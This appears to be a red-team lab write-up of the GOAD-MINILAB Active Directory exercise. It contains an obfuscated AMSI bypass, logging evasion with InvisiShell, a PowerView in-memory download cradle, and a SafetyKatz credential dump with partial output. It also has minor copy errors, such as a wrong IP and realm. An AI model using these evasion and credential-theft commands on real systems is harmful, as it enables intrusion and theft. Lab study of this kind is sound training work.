@@ -1,0 +1,721 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>GOAD-MINILAB | Mr Stark Study Notes</title>
+  <link rel="shortcut icon" href="../assets/images/logo.ico" type="image/x-icon">
+  <link rel="stylesheet" href="../assets/css/style.css">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">
+  <style>
+    .goad-content {
+      max-width: 900px;
+      margin: 0 auto;
+      padding: 20px;
+    }
+    
+    .goad-content h1 {
+      color: var(--white-2);
+      font-size: var(--fs-1);
+      margin-bottom: 20px;
+    }
+    
+    .goad-content h2 {
+      color: var(--orange-yellow-crayola);
+      font-size: var(--fs-2);
+      margin: 30px 0 15px 0;
+      padding-bottom: 10px;
+      border-bottom: 1px solid var(--jet);
+    }
+    
+    .goad-content h3 {
+      color: var(--white-1);
+      font-size: var(--fs-3);
+      margin: 25px 0 10px 0;
+    }
+    
+    .goad-content p {
+      color: var(--light-gray);
+      margin-bottom: 15px;
+      line-height: 1.8;
+    }
+    
+    .goad-content code {
+      background: var(--onyx);
+      color: var(--orange-yellow-crayola);
+      padding: 2px 6px;
+      border-radius: 4px;
+      font-family: 'Courier New', monospace;
+      font-size: 0.9em;
+    }
+    
+    .goad-content pre {
+      background: var(--eerie-black-2);
+      border: 1px solid var(--jet);
+      border-radius: 8px;
+      padding: 15px;
+      overflow-x: auto;
+      margin: 15px 0;
+    }
+    
+    .goad-content pre code {
+      background: transparent;
+      color: var(--light-gray);
+      padding: 0;
+    }
+    
+    .goad-content img {
+      max-width: 100%;
+      border-radius: 8px;
+      margin: 20px 0;
+      border: 1px solid var(--jet);
+    }
+    
+    .goad-content strong {
+      color: var(--white-2);
+    }
+    
+    .sidebar-info_more {
+      display: block !important;
+    }
+    
+    .back-link {
+      color: var(--light-gray);
+      text-decoration: none;
+      display: flex;
+      align-items: center;
+      gap: 5px;
+      margin-bottom: 20px;
+      font-size: var(--fs-7);
+    }
+    
+    .back-link:hover {
+      color: var(--orange-yellow-crayola);
+    }
+    
+    .lab-meta {
+      display: flex;
+      gap: 15px;
+      flex-wrap: wrap;
+      margin: 20px 0 30px 0;
+    }
+    
+    .lab-meta span {
+      background: var(--onyx);
+      padding: 8px 16px;
+      border-radius: 20px;
+      color: var(--orange-yellow-crayola);
+      font-size: var(--fs-7);
+    }
+  </style>
+</head>
+<body>
+  <main>
+    <!-- Sidebar -->
+    <aside class="sidebar" data-sidebar>
+      <div class="sidebar-info">
+        <figure class="avatar-box">
+          <img src="../assets/images/my-avatar.png?v=3" alt="Mr Stark" width="80">
+        </figure>
+        <div class="info-content">
+          <h1 class="name" title="Mr Stark">Mr Stark</h1>
+          <p class="title">GOAD Series</p>
+        </div>
+        <button class="info_more-btn" data-sidebar-btn>
+          <span>Show Labs</span>
+          <ion-icon name="chevron-down"></ion-icon>
+        </button>
+      </div>
+
+      <div class="sidebar-info_more">
+        <div class="separator"></div>
+        
+        <a href="../index.html" class="back-link">
+          <ion-icon name="arrow-back-outline"></ion-icon>
+          Back to Portfolio
+        </a>
+        
+        <div class="separator"></div>
+        
+        <p style="color: var(--light-gray); font-size: var(--fs-7); margin-bottom: 10px;">GOAD Labs:</p>
+        
+        <ul class="goad-sidebar-list" style="list-style: none; padding: 0;">
+          <li><a href="../goad/" style="color: var(--light-gray); text-decoration: none; display: block; padding: 8px 12px; border-radius: 8px; font-size: var(--fs-7);">GOAD - Full Lab</a></li>
+          <li><a href="index.html" style="color: var(--orange-yellow-crayola); text-decoration: none; display: block; padding: 8px 12px; border-radius: 8px; font-size: var(--fs-7); background: var(--onyx);">GOAD-MINILAB</a></li>
+        </ul>
+
+        <div class="separator"></div>
+        
+        <p style="color: var(--light-gray); font-size: var(--fs-7); margin-bottom: 10px;">Other Labs:</p>
+        
+        <ul class="goad-sidebar-list" style="list-style: none; padding: 0;">
+          <li><a href="../ninja-hacker-academy/" style="color: var(--light-gray); text-decoration: none; display: block; padding: 8px 12px; border-radius: 8px; font-size: var(--fs-7);">Ninja Hacker Academy</a></li>
+        </ul>
+
+        <div class="separator"></div>
+        
+        <ul class="social-list">
+          <li class="social-item">
+            <a href="https://github.com/daviosardinha/mr-stark-study-notes" class="social-link" target="_blank">
+              <ion-icon name="logo-github"></ion-icon>
+            </a>
+          </li>
+        </ul>
+      </div>
+    </aside>
+
+    <!-- Main Content -->
+    <div class="main-content">
+      <article class="about active" data-page="about">
+        <header class="h2 article-title">GOAD-MINILAB</header>
+        
+        <section class="goad-content">
+          
+          <p style="font-size: var(--fs-4); color: var(--light-gray); margin-bottom: 20px;">
+            A lightweight version of the Game of Active Directory lab. Perfect for quick testing and learning Active Directory attacks on a smaller scale.
+          </p>
+
+          <div class="lab-meta">
+            <span>Single Domain</span>
+            <span>2 VMs</span>
+            <span>Beginner Friendly</span>
+          </div>
+
+          <h2>🖥️ Lab Environment</h2>
+          <ul style="color: var(--light-gray); margin: 15px 0; padding-left: 30px;">
+            <li><strong>Domain:</strong> <code>mini.lab</code></li>
+            <li><strong>DC:</strong> 192.168.40.128</li>
+            <li><strong>Workstation:</strong> 192.168.40.129</li>
+            <li><strong>OS:</strong> Windows Server & Windows 10</li>
+          </ul>
+
+          <h2>📚 Lab Content</h2>
+
+
+<p>**`Ports=$( sudo nmap -p- --min-rate 300 --max-rate 500 -Pn 192.168.40.0/24 | grep "^[0-9]" | cut -d '/' -f 1 | tr '\n' ',' | sed "s/,$//")</p>
+<p>sudo nmap -sC -sV -p$Ports -oN Full_TCP_Scan_245 192.168.40.0/24`**</p>
+
+<pre><code class="language-bash">Nmap scan report for 192.168.40.128
+<p>Host is up (0.0014s latency).</p>
+
+<p>PORT      STATE    SERVICE        VERSION</p>
+<p>88/tcp    open     kerberos-sec   Microsoft Windows Kerberos (server time: 2025-03-22 15:00:00Z)</p>
+<p>135/tcp   open     msrpc          Microsoft Windows RPC</p>
+<p>139/tcp   open     netbios-ssn    Microsoft Windows netbios-ssn</p>
+<p>389/tcp   open     ldap           Microsoft Windows Active Directory LDAP (Domain: mini.lab0., Site: Default-First-Site-Name)</p>
+<p>445/tcp   open     microsoft-ds?</p>
+<p>464/tcp   open     kpasswd5?</p>
+<p>593/tcp   open     ncacn_http     Microsoft Windows RPC over HTTP 1.0</p>
+<p>636/tcp   open     tcpwrapped</p>
+<p>902/tcp   filtered iss-realsecure</p>
+<p>2200/tcp  filtered ici</p>
+<p>2201/tcp  filtered ats</p>
+<p>2202/tcp  filtered imtc-map</p>
+<p>2222/tcp  filtered EtherNetIP-1</p>
+<p>3268/tcp  open     ldap           Microsoft Windows Active Directory LDAP (Domain: mini.lab0., Site: Default-First-Site-Name)</p>
+<p>3269/tcp  open     tcpwrapped</p>
+<p>3389/tcp  open     ms-wbt-server  Microsoft Terminal Services</p>
+<p>| ssl-cert: Subject: commonName=dc.mini.lab</p>
+<p>| Not valid before: 2025-03-21T01:36:20</p>
+<p>|_Not valid after:  2025-09-20T01:36:20</p>
+<p>|_ssl-date: 2025-03-22T15:03:16+00:00; 0s from scanner time.</p>
+<p>5040/tcp  filtered unknown</p>
+<p>5985/tcp  open     http           Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</p>
+<p>|_http-title: Not Found</p>
+<p>|_http-server-header: Microsoft-HTTPAPI/2.0</p>
+<p>5986/tcp  open     ssl/http       Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</p>
+<p>| tls-alpn: </p>
+<p>|_  http/1.1</p>
+<p>| ssl-cert: Subject: commonName=VAGRANT</p>
+<p>| Subject Alternative Name: DNS:VAGRANT, DNS:vagrant</p>
+<p>| Not valid before: 2025-03-20T17:57:42</p>
+<p>|_Not valid after:  2028-03-19T17:57:42</p>
+<p>|_http-server-header: Microsoft-HTTPAPI/2.0</p>
+<p>|_ssl-date: 2025-03-22T15:03:16+00:00; 0s from scanner time.</p>
+<p>|_http-title: Not Found</p>
+<p>7680/tcp  filtered pando-pub</p>
+<p>9389/tcp  open     mc-nmf         .NET Message Framing</p>
+<p>47001/tcp filtered winrm</p>
+<p>49664/tcp filtered unknown</p>
+<p>49665/tcp filtered unknown</p>
+<p>49666/tcp filtered unknown</p>
+<p>49667/tcp filtered unknown</p>
+<p>49668/tcp open     msrpc          Microsoft Windows RPC</p>
+<p>49669/tcp filtered unknown</p>
+<p>49670/tcp open     msrpc          Microsoft Windows RPC</p>
+<p>49671/tcp open     ncacn_http     Microsoft Windows RPC over HTTP 1.0</p>
+<p>49673/tcp open     msrpc          Microsoft Windows RPC</p>
+<p>49674/tcp open     msrpc          Microsoft Windows RPC</p>
+<p>49685/tcp filtered unknown</p>
+<p>49692/tcp open     msrpc          Microsoft Windows RPC</p>
+<p>49748/tcp open     msrpc          Microsoft Windows RPC</p>
+<p>55985/tcp filtered unknown</p>
+<p>55986/tcp filtered unknown</p>
+<p>MAC Address: 00:0C:29:74:B1:CB (VMware)</p>
+<p>Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows</p>
+
+<p>Host script results:</p>
+<p>|_nbstat: NetBIOS name: DC, NetBIOS user: <unknown>, NetBIOS MAC: 00:0c:29:74:b1:cb (VMware)</p>
+<p>| smb2-time: </p>
+<p>|   date: 2025-03-22T15:02:37</p>
+<p>|_  start_date: N/A</p>
+<p>| smb2-security-mode: </p>
+<p>|   3:1:1: </p>
+<p>|_    Message signing enabled and required</p>
+
+<p>Nmap scan report for 192.168.40.129</p>
+<p>Host is up (0.0013s latency).</p>
+
+<p>PORT      STATE  SERVICE          VERSION</p>
+<p>88/tcp    closed kerberos-sec</p>
+<p>135/tcp   open   msrpc            Microsoft Windows RPC</p>
+<p>139/tcp   open   netbios-ssn      Microsoft Windows netbios-ssn</p>
+<p>389/tcp   closed ldap</p>
+<p>445/tcp   open   microsoft-ds?</p>
+<p>464/tcp   closed kpasswd5</p>
+<p>593/tcp   closed http-rpc-epmap</p>
+<p>636/tcp   closed ldapssl</p>
+<p>902/tcp   closed iss-realsecure</p>
+<p>2200/tcp  closed ici</p>
+<p>2201/tcp  closed ats</p>
+<p>2202/tcp  closed imtc-map</p>
+<p>2222/tcp  closed EtherNetIP-1</p>
+<p>3268/tcp  closed globalcatLDAP</p>
+<p>3269/tcp  closed globalcatLDAPssl</p>
+<p>3389/tcp  open   ms-wbt-server    Microsoft Terminal Services</p>
+<p>| ssl-cert: Subject: commonName=ws.mini.lab</p>
+<p>| Not valid before: 2025-03-21T01:49:40</p>
+<p>|_Not valid after:  2025-09-20T01:49:40</p>
+<p>|_ssl-date: 2025-03-22T15:03:16+00:00; 0s from scanner time.</p>
+<p>5040/tcp  open   unknown</p>
+<p>5985/tcp  open   http             Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</p>
+<p>|_http-title: Not Found</p>
+<p>|_http-server-header: Microsoft-HTTPAPI/2.0</p>
+<p>5986/tcp  open   ssl/http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</p>
+<p>|_http-title: Not Found</p>
+<p>| ssl-cert: Subject: commonName=VAGRANT-10</p>
+<p>| Subject Alternative Name: DNS:VAGRANT-10, DNS:vagrant-10</p>
+<p>| Not valid before: 2025-03-20T18:30:37</p>
+<p>|_Not valid after:  2028-03-19T18:30:37</p>
+<p>|_ssl-date: 2025-03-22T15:03:16+00:00; 0s from scanner time.</p>
+<p>|_http-server-header: Microsoft-HTTPAPI/2.0</p>
+<p>| tls-alpn: </p>
+<p>|_  http/1.1</p>
+<p>7680/tcp  open   pando-pub?</p>
+<p>9389/tcp  closed adws</p>
+<p>47001/tcp open   http             Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</p>
+<p>|_http-server-header: Microsoft-HTTPAPI/2.0</p>
+<p>|_http-title: Not Found</p>
+<p>49664/tcp open   msrpc            Microsoft Windows RPC</p>
+<p>49665/tcp open   msrpc            Microsoft Windows RPC</p>
+<p>49666/tcp open   msrpc            Microsoft Windows RPC</p>
+<p>49667/tcp open   msrpc            Microsoft Windows RPC</p>
+<p>49668/tcp open   msrpc            Microsoft Windows RPC</p>
+<p>49669/tcp open   msrpc            Microsoft Windows RPC</p>
+<p>49670/tcp open   msrpc            Microsoft Windows RPC</p>
+<p>49671/tcp open   msrpc            Microsoft Windows RPC</p>
+<p>49673/tcp closed unknown</p>
+<p>49674/tcp closed unknown</p>
+<p>49685/tcp open   msrpc            Microsoft Windows RPC</p>
+<p>49692/tcp closed unknown</p>
+<p>49748/tcp closed unknown</p>
+<p>55985/tcp closed unknown</p>
+<p>55986/tcp closed unknown</p>
+<p>MAC Address: 00:0C:29:89:78:3A (VMware)</p>
+<p>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</p>
+
+<p>Host script results:</p>
+<p>| smb2-time: </p>
+<p>|   date: 2025-03-22T15:02:37</p>
+<p>|_  start_date: N/A</p>
+<p>| smb2-security-mode: </p>
+<p>|   3:1:1: </p>
+<p>|_    Message signing enabled but not required</p>
+<p>|_nbstat: NetBIOS name: WS, NetBIOS user: <unknown>, NetBIOS MAC: 00:0c:29:89:78:3a (VMware)</p>
+</code></pre>
+
+<p>As we can see above from our NMAP scan, we have 2 IPs <strong><code>192.168.40.138</code></strong> and <strong><code>192.168.40.129</code></strong> and they are configured inside domain <strong><code>mini.lab</code></strong>.</p>
+<p>It is possible to see that we are dealing with a windows environment. Let’s configure FQDN.</p>
+
+<h3>Setting Up FQDN</h3>
+
+<p>A fully qualified domain name, sometimes also referred to as an absolute domain name, is a domain name that specifies its exact location in the tree hierarchy of the Domain Name System. It specifies all domain levels, including the top-level domain and the root zone.</p>
+
+<img src="https://res.cloudinary.com/lwgatsby/f_auto/www/uploads/2021/08/fqdn-1-fqdn.png" alt="">
+
+<h4>Why do we configure an FQDN?</h4>
+
+<p>FQDNs are <strong>easier to remember than IP addresses and are needed to configure the DNS and IP address of a device on the internet</strong>. </p>
+<p>For example, when trying to reach Google, it's much easier to type google.com in the browser, instead of finding and typing its numerical IP address. Getting an SSL certificate.</p>
+
+<h4>DNSMASQ</h4>
+
+<p>Dnsmasq is <strong>designed to act as a DNS forwarder, DHCP server, and TFTP server for small networks</strong>. You can use dnsmasq as an alternative to configuring separate DHCP and TFTP services.</p>
+
+<p>First we start by installing dnsmasq</p>
+<code>sudo apt install -y dnsmasq</code>
+
+<p>Then we need to do some small configurations. We will make dnsmasq to use /etc/hosts file to read the machines configured on the file for the translation.</p>
+<p>Let’s config the /etc/hosts file and add the IPs of the machines we need and their names.</p>
+
+<code>sudo vim /etc/hosts</code>
+
+<img src="GOAD-MINILAB/images/image-529.png" alt="images/image-529.png">
+
+<p>Now we edit the /etc/resolv.conf file and add the follow configuration.</p>
+
+<code>sudo vim etc/resolv.conf</code>
+
+<img src="GOAD-MINILAB/image%201.png" alt="images/image-529.png">
+
+<p>Last but not list we need to start our dnsmasq and make it read the /etc/hosts file and we are ready to go.</p>
+<code>dnsmasq -H /etc/hosts</code>
+
+<p>It’s all set, we can now test it by using host and the name of the servers and it will be translate it to the real IPs.</p>
+
+<strong><code>host dc.mini.lab</code></strong>
+
+<strong><code>host ws.mini.lab</code></strong>
+
+<img src="GOAD-MINILAB/image%202.png" alt="images/image-529.png">
+
+<h3>Setting Up Kerberos</h3>
+
+<p>We must install the Linux kerberos client</p>
+
+<code>sudo apt install krb5-user</code>
+
+<p>Questions should be answer in this order:</p>
+
+<p>Default Kerberos Version 5 realm: <code>lustrous2.vl</code></p>
+<p>Kerberos servers for your realm: <code>lus2dc.lustrous2.local</code></p>
+
+<p>We need to configure <strong>/etc/krb5.conf</strong> file like this:</p>
+
+<pre><code class="language-bash">[libdefaults]
+<p>	default_realm = HOME</p>
+
+<h2>The following krb5.conf variables are only for MIT Kerberos.</h2>
+<p>	kdc_timesync = 1</p>
+<p>	ccache_type = 4</p>
+<p>	forwardable = true</p>
+<p>	proxiable = true</p>
+<p>        rdns = false</p>
+
+<h2>The following libdefaults parameters are only for Heimdal Kerberos.</h2>
+<p>	fcc-mit-ticketflags = true</p>
+
+<p>[realms]</p>
+<p>	HOME = {</p>
+<p>		kdc = 1</p>
+<p>	}</p>
+<p>	MINI.LAB = {</p>
+<p>		kdc = DC.MINI.LAB</p>
+<p>		admin_server = DC.MINI.LAB</p>
+<p>	}</p>
+<p>[domain_realm]</p>
+<p>	.mini.lab = MINI.LAB</p>
+</code></pre>
+
+<p>Now we are ready to start.</p>
+
+<p>So we start with a a quick Recon using NetExec to find out all the Windows machines in the network.</p>
+
+<code>netexec smb 192.168.40.0/24</code>
+
+<img src="GOAD-MINILAB/image%203.png" alt="images/image-529.png">
+
+<h4>SMB Shares enumeration with smbclient</h4>
+
+<code>smbclient -U '' -L \\\\ws.mini.lab -N --option='client min protocol=NT1'</code>
+
+<img src="GOAD-MINILAB/image%204.png" alt="images/image-529.png">
+
+<h4>SMB Shares enumeration with NetExec</h4>
+
+<code>netexec smb ws.mini.lab -u '' -p ''</code>
+
+<img src="GOAD-MINILAB/image%205.png" alt="images/image-529.png">
+
+<h4>Password Policy Enumeration</h4>
+
+<p>Let’s see if we can enumerate internal Password Policy and we will use NetExec as well.</p>
+
+<img src="GOAD-MINILAB/image%206.png" alt="images/image-529.png">
+
+<p>We can see above that password policy for mini.lab domain is minimum 5 and maximum 24 length.</p>
+
+<h2>Insecure LSA Configuration Allowing Null Session Enumeration</h2>
+
+<p>An Insecure LSA Configuration Allowing Null Session Enumeration is a misconfiguration in Windows where the system allows unauthenticated users (null sessions) to request and receive information about domain users and groups. This happens because the Local Security Authority (LSA) is set to permit anonymous access, typically due to the RestrictAnonymous registry setting being set to 0. As a result, an attacker can connect without credentials and enumerate usernames and group memberships, which can be used for further attacks like password spraying or privilege escalation.</p>
+
+<p>We can enumerate users using NetExec and if we have a misconfigured domain we will be able to retrieve the list of users and also their Description.</p>
+
+<p> <code>netexec smb dc.mini.lab -u '' -p '' --users</code></p>
+
+<img src="GOAD-MINILAB/image%207.png" alt="images/image-529.png">
+
+<p>This Insecure LSA configuration allowed us to retried the list of some users registered in this domain, at least part of it.  We found 2  non default users (Bob & Dave) and it is also possible to see that under Bob’s description we can find Bob’s password. </p>
+
+<p>Before we try to login, we can also use NetExec to check if this user is really a valid user inside the domain.</p>
+
+<code>netexec smb ws.mini.lab -u 'bob' -p 'superman'</code>
+
+<img src="GOAD-MINILAB/image%208.png" alt="images/image-529.png">
+
+<code>netexec rdp ws.mini.lab -u 'bob' -p 'superman'</code>
+
+<img src="GOAD-MINILAB/image%209.png" alt="images/image-529.png">
+
+<p>So I used the same credentials to access <strong><code>ws.mini.lab</code></strong> workstation.</p>
+<p><strong>Username:</strong> Bob</p>
+<p><strong>Password:</strong> superman</p>
+
+<img src="GOAD-MINILAB/image%2010.png" alt="images/image-529.png">
+
+<p>Well, now we do have access inside mini.lab domain with a valid user. </p>
+<p>Let’s now start enumerating this domain.</p>
+
+<p>Well, from a simple enumeration, we can see that bob is local admin on this machine and also he is part of <strong><code>wsadmin</code></strong> group inside <strong><code>mini.lab</code></strong> domain.</p>
+
+<code>whoami /all</code>
+
+<img src="GOAD-MINILAB/image%2011.png" alt="images/image-529.png">
+
+<h2>Enumerating the mini.lab domain</h2>
+
+<p>Let’s start by running InvisiShell before we start our enumeration.</p>
+
+<p>InvisiShell is a stealthy PowerShell execution framework that hides command execution from traditional logging and monitoring by hooking the .NET framework, allowing attackers to run PowerShell commands without generating typical event logs or command-line traces. We can simply execute the.bat file or copy/paste it inside our CMD session.</p>
+
+<p>As soon as <strong>we</strong> run InvisiShell using the <code>RunWithRegistryNonAdmin.bat</code> script, it sets environment variables and registry keys that tell the .NET runtime to load a custom profiler DLL (<code>InShellProf.dll</code>) via <code>COR_ENABLE_PROFILING</code> and <code>COR_PROFILER</code>.</p>
+
+<p>Once set, when <strong>we</strong> launch PowerShell, the .NET runtime loads that profiler DLL into the PowerShell process. This DLL hooks into the .NET methods, allowing our commands to be executed stealthily, without generating common PowerShell logs (like Event ID 4104, command-line arguments, or script block logs).</p>
+
+<code>RunWithRegistryNonAdmin.bat</code>
+
+<pre><code class="language-bash">set COR_ENABLE_PROFILING=1
+<p>set COR_PROFILER={cf0d821e-299b-5307-a3d8-b283c03916db}</p>
+
+<p>REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}" /f</p>
+<p>REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}\InprocServer32" /f</p>
+<p>REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}\InprocServer32" /ve /t REG_SZ /d "%~dp0InShellProf.dll" /f</p>
+
+<p>powershell</p>
+
+<p>set COR_ENABLE_PROFILING=</p>
+<p>set COR_PROFILER=</p>
+<p>REG DELETE "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}" /f</p>
+</code></pre>
+
+<p>In short: PowerShell starts in a "ghost mode," where it can execute commands without being logged by default security mechanisms.</p>
+
+<img src="GOAD-MINILAB/image%2012.png" alt="images/image-529.png">
+
+<pre><code class="language-bash">S`eT-It`em ( 'V'+'aR' +  'IA' + (("{1}{0}"-f'1','blE:')+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f '.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f 'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f 'ile','a'))  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}" -f'ubl','P')+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
+</code></pre>
+
+<p>Enumerating PowerShell Version.</p>
+
+<code>$PSVersionTable.PSVersion</code>
+
+<img src="GOAD-MINILAB/image%2013.png" alt="images/image-529.png">
+
+<p>We are in <strong>PowerShell 5.1 (build 19041)</strong> this version <strong>has AMSI and ScriptBlock Logging enabled by default</strong>, so typical AMSI bypasses often get flagged.</p>
+
+<code>netsh interface portproxy add v4tov4 listenport=8080 listenaddress=127.0.0.1 connectport=8080 connectaddress=192.168.40.1</code>
+
+<img src="GOAD-MINILAB/image%2014.png" alt="images/image-529.png">
+
+<p>I tried to import and run PowerView.ps1 into the memory for enumeration, but I was getting caught by the Defender, so I decided to use ADModule.</p>
+
+<p>Enumeration Users with ADModule</p>
+
+<code>Invoke-WebRequest [http://127.0.0.1:8080/Microsoft.ActiveDirectory.Management.dll](http://127.0.0.1:8080/Microsoft.ActiveDirectory.Management.dll) -OutFile [Microsoft.ActiveDirectory.Management.dll](http://127.0.0.1:8080/Microsoft.ActiveDirectory.Management.dll)  -UseBasicParsing</code>
+
+<p><code>Import-Module .\[Microsoft.ActiveDirectory.Management.dll](http://127.0.0.1:8080/Microsoft.ActiveDirectory.Management.dll)</code> </p>
+
+<img src="GOAD-MINILAB/image%2015.png" alt="images/image-529.png">
+
+<code>Get-ADUser -Filter * | Select -ExpandProperty 'Name'</code>
+
+<img src="GOAD-MINILAB/image%2016.png" alt="images/image-529.png">
+
+<strong>Why We Saw Only 2 Users with Insecure LSA Configuration Allowing Null Session Enumeration, but More with Authenticated Access</strong>
+
+<p>When we performed enumeration with a <strong>null session</strong> (no credentials), we’re limited to only what <strong>anonymous users</strong> are allowed to see. This depends on how the domain is configured usually, anonymous access is heavily restricted, so we might only get a partial list or a few users that are exposed by default or misconfigured.</p>
+
+<p>Once we compromise a valid <strong>domain user</strong>, we’re no longer anonymous now we're authenticated, and our compromised account has permissions to see more information in the domain like, Query Active Directory more fully, Get a complete list of domain users, Access objects that are protected from anonymous enumeration</p>
+
+<p>Enumeration Computers with ADModule</p>
+
+<code>Get-ADUser -Filter * | Select -ExpandProperty 'SamAccountName'</code>
+
+<img src="GOAD-MINILAB/image%2017.png" alt="images/image-529.png">
+
+<p>Enumerating Groups with ADModule</p>
+
+<code>Get-ADGroup -Filter * | Select -ExpandProperty 'SamAccountName'</code>
+
+<img src="GOAD-MINILAB/image%2018.png" alt="images/image-529.png">
+
+<code>Get-ADGroup -Identity 'Administrators'</code>
+
+<code>Get-ADGroup -Identity 'Administrators' -Properties *</code>
+
+<img src="GOAD-MINILAB/image%2019.png" alt="images/image-529.png">
+
+<code>Get-ADGroup -Identity 'wsrdp'</code>
+
+<code>Get-ADGroup -Identity 'wsrdp' -Properties *</code>
+
+<img src="GOAD-MINILAB/image%2020.png" alt="images/image-529.png">
+
+<code>Get-ADGroup -Identity 'wsadmin'</code>
+
+<code>Get-ADGroup -Identity 'wsadmin'-Properties *</code>
+
+<img src="GOAD-MINILAB/image%2021.png" alt="images/image-529.png">
+
+<h4>Special Group</h4>
+
+<p>There is a special case here for a special group. If you remember from our Groups enumeration, there is a Group named ‘<code>Enterprise Admins'</code></p>
+
+<p>The <strong>Enterprise Admins group</strong> is a highly privileged security group in a Microsoft Active Directory (AD) forest. It exists only in the <strong>root domain</strong> of the AD forest and grants its members administrative privileges across the entire forest, including all child domains. Members of this group have the ability to manage any domain, Domain Controllers (DCs), and critical AD components across the forest.</p>
+
+<p>From an <strong>offensive security perspective</strong>, enumerating the <strong>Enterprise Admins</strong> group is crucial because it provides insight into who holds the <strong>keys to the forest</strong>, opening pathways to achieve <strong>forest dominance</strong>.</p>
+
+<h4><strong>Offensive Use Case Example</strong></h4>
+
+<p>1. You compromise a low-privileged account in a child domain.</p>
+<p>2. Enumerate <strong>Enterprise Admins</strong> to identify privileged accounts.</p>
+<p>3. Use <strong>pass-the-hash</strong>, <strong>Kerberoasting</strong>, or other techniques to compromise an Enterprise Admin account.</p>
+<p>4. With the Enterprise Admin account:</p>
+<p>    - Access the root domain.</p>
+<p>    - Perform a <strong>DCSync attack</strong> to dump the <strong>krbtgt hash</strong>, enabling a <strong>Golden Ticket attack</strong>.</p>
+<p>    - Use forest-level privileges to compromise all child domains or maintain persistence.</p>
+
+<h4><strong>Takeaways</strong></h4>
+
+<p>For a Red Teamer or Pentester:</p>
+
+<p>- The <strong>Enterprise Admins group</strong> is the ultimate prize when targeting AD environments because of its forest-wide privileges.</p>
+<p>- Enumerating this group provides a roadmap to identifying the most critical accounts in the environment.</p>
+<p>- Once an Enterprise Admin is compromised, you essentially own the entire AD forest, enabling lateral movement, persistence, and complete control over the target network.</p>
+
+<code>Get-ADGroupMember -Identity 'Enterprise Admins' -Server 'mini.lab'</code>
+
+<img src="GOAD-MINILAB/image%2022.png" alt="images/image-529.png">
+
+<p>From our enumeration, It seems like, Administrator is the only member of this Special Group.</p>
+
+<code>Get-ADOrganizationalUnit -Filter *</code>
+
+<img src="GOAD-MINILAB/image%2023.png" alt="images/image-529.png">
+
+<p>Now that we were able to find all the OU inside our domain, we can see or list all the computers that belong to any specific student of our choice.</p>
+
+<code>Get-ADOrganizationalUnit -Identity 'OU=Domain Controllers,DC=mini,DC=lab' | %{Get-ADComputer -SearchBase $_ -Filter *} | Select name</code>
+
+<img src="GOAD-MINILAB/image%2024.png" alt="images/image-529.png">
+
+<h3>Enumerating Local Admin Access with PowerView</h3>
+
+<p>We can enumerate if our current user has local admin access into any valid machine inside this domain and to accomplish this we do have several tools, for example we can use PowerView.ps1 for that.</p>
+
+<p>Let’s import and run PowerView into the memory to avoid Defender detection.</p>
+
+<p><code>IEX(New-Object Net.WebClient).DownloadString("http://127.0.0.1:8080/PowerView.ps1")</code> </p>
+
+<code>Find-LocalAdminAccess -Verbose</code>
+
+<img src="GOAD-MINILAB/image%2025.png" alt="images/image-529.png">
+
+<p>Our current user only have Local Admin Access inside ws.mini.lab, which is the current host we have compromised so far.</p>
+
+<h2>Enumerating ACLs with ADModule</h2>
+
+<code>(Get-Acl 'AD:\CN=wsadmin,CN=Users,DC=mini,DC=lab').Access | Select-Object IdentityReference, ActiveDirectoryRights, IsInherited, InheritanceType, ObjectType</code>
+
+<img src="GOAD-MINILAB/image%2026.png" alt="images/image-529.png">
+
+<code>(Get-Acl 'AD:\CN=wsadmin,CN=Users,DC=mini,DC=lab').Access | Where-Object { $_.IdentityReference -match 'BUILTIN\\Administrators' } | Select IdentityReference, ActiveDirectoryRights, ObjectType</code>
+
+<img src="GOAD-MINILAB/image%2027.png" alt="images/image-529.png">
+
+<p>After some enumeration I decided to dump the credentials. </p>
+
+<p>I sad to disable Firewall to be able to upload a my DotNet Loader and execute SafetyKatz from the memory.</p>
+
+<code>Invoke-WebRequest [http://127.0.0.1:8080/Loader.exe](http://127.0.0.1:8080/Loader.exe) -OutFile Loader.exe -UseBasicParsing</code>
+
+<code>C:\Loader.exe -Path [http://127.0.0.1:8080/SafetyKatz.exe](http://127.0.0.1:8080/SafetyKatz.exe) -args 'sekurlsa::logonpasswords' 'exit'</code>
+
+<img src="GOAD-MINILAB/image%2028.png" alt="images/image-529.png">
+
+<pre><code class="language-bash">Authentication Id : 0 ; 8375533 (00000000:007fcced)
+<p>Session           : NetworkCleartext from 0</p>
+<p>User Name         : carol</p>
+<p>Domain            : MINILAB</p>
+<p>Logon Server      : DC</p>
+<p>Logon Time        : 3/22/2025 1:27:13 PM</p>
